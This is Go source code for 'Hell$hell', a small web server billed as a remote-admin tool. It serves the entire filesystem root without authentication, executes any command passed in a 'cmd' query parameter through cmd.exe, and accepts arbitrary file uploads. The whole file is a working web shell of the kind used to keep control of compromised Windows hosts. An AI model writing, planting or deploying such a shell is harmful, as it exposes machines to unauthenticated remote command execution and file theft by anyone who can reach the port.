/*
The hell$hell is lightweight web file server for remote admins
Browsing and transfer files, execute command
By default Service run at http://localhost:1666/
*/

package main

import (
	"fmt"
	"html"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

//Data
const Revision = "$Id$" // Revision ID
var (
	stdout []byte //Output of command
	dirs []string // Catalogs of Path
	err    error  //Error
)

//myContract (HTTP response)
func myContract(serv http.Handler) http.Handler {
	return http.HandlerFunc( func(w http.ResponseWriter, r *http.Request) {
		if  0 < strings.Index ( r.URL.Path, "favicon.ico" )  {
//TODO return favicon.ico
			return	
		}
		//Navigation panel
		dirs = strings.Split( r.URL.Path, "/" )
		var navi, href []string
		navi = append (navi, "<a href=\"/\">ROOT</a>/<a href=\"/")
		for _, part := range dirs [1: len(dirs)-1] {
			href = append (href, part)
			href = append (href, "/")
			navi = append (navi, strings.Join(href, "") )
			navi = append (navi, "\">")
			navi = append (navi, part)
			navi = append (navi, "</a>/<a href=\"/")
		} 
		navi = navi [: len(navi)-1]
		navi = append (navi, "</a><br/>\n")
		//Navigation panel

		io.WriteString(w, htmlhead) //Before
		io.WriteString(w, strings.Join(navi, "") ) //Navigation
		serv.ServeHTTP(w, r)        //Call origin
		io.WriteString(w, strings.Join(navi, "") ) //Navigation
		io.WriteString(w, htmlform) //Web Interface

		if r.Method == "POST" { //Upload file
//TODO Uplad file to directory in URL path
			r.ParseMultipartForm(32 << 20)
			if file, handler, err := r.FormFile("uploadfile"); err == nil {
				defer file.Close()
				f, err := os.OpenFile("./"+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)
				if err != nil {
					fmt.Println(err)
				}
				defer f.Close()
				io.Copy(f, file)
			} else {
				fmt.Println(err)
			}
		}

		if len(r.URL.Query().Get("cmd")) > 0 { //Run shell command
			stdout, err = exec.Command("cmd", "/C", r.FormValue("cmd")).Output()
//TODO Timeout for execute command
			if err != nil {
				io.WriteString(w, err.Error())
			}
			io.WriteString(w, html.EscapeString(string(stdout)))
		}
		io.WriteString(w, htmltail) //After
	})
}

//HellShell init
func init() {
	http.Handle("/", myContract(http.FileServer(http.Dir("/"))))
	http.ListenAndServe(":1666", nil)
}

//HellShell run
func main() {}

//Web-muzzle
var htmltail string = "</pre></body></html>"

var htmlhead string = `
<!DOCTYPE html>
<html>
<head><title>Hell$hell</title></head>
<style>
pre {
	font-family: Consolas, Courier New
}
body {
	text-align: left;
	margin-left: 10%;
	font-family: Consolas;
	font-size: 14pt;
}
input {
	font-family: Consolas;
	font-size: 16pt;
}
.cmd {
	width: 70%;
	font-family: Consolas;
	font-size: 14pt;
}
.middle {
	vertical-align: middle;
	height: 7em;
	line-height: 7em;
}
</style>
<body>
`

var htmlform string = `
<div class="middle">
	<form id="cmdstr">
cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="" autofocus />
		<input type="submit" value="Enter" /><br/>
	</form>
	<hr/>
	<form enctype="multipart/form-data" action="" method="post">
 		<input type="file" name="uploadfile" />
 	   <input type="hidden" name="token" value="{{.}}"/>
 	  	 <input type="submit" value="upload" />
	</form>
</div>
<script type="text/javascript">document.cmdstr.cmd.focus();</script>
<hr/>
<pre>
`

//EOF
